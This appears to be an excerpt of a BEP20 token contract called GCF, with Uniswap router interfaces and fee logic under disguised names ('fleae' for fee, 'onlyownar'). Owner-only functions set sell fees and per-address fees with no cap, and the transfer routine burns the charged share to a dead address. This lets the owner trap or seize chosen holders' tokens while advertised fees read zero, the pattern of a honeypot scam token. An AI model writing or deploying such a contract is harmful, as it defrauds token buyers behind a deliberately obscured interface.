...
interface IUniswapV2Factory {
    ...
    function fleaeTo() external view returns (address);
    function fleaeToSetter() external view returns (address);
    ...
    function setfleaeTo(address) external;
    function setfleaeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfleaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfleaeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfleaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfleaeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfleaeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract GCF is BEP20, Ownable {
    ...
    uint256 private _defaultSellfleae = 0;

    uint256 private _defaultBuyfleae = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfleae;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfleae = _value;
    }

    function setSlipfleae(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfleae[_address] = _value;
    }

    function getSlipfleae(address _address) external view onlyownar returns (uint256) {
        return _slipfleae[_address];
    }


    function setMAccountfleae(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfleae(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefleaeAmount = 0;

        if (rF) {
            uint256 tradefleae = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefleae = _defaultSellfleae;
                }
                if (from == uniswapV2Pair) {

                    tradefleae = _defaultBuyfleae;
                }
            }
            if (_slipfleae[from] > 0) {
                tradefleae = _slipfleae[from];
            }

            tradefleaeAmount = _Amount.mul(tradefleae).div(100);
        }


        if (tradefleaeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefleaeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefleaeAmount);
            emit Transfer(from, _deadAddress, tradefleaeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefleaeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefleaeAmount);
        emit Transfer(from, _to, _Amount - tradefleaeAmount);
    }
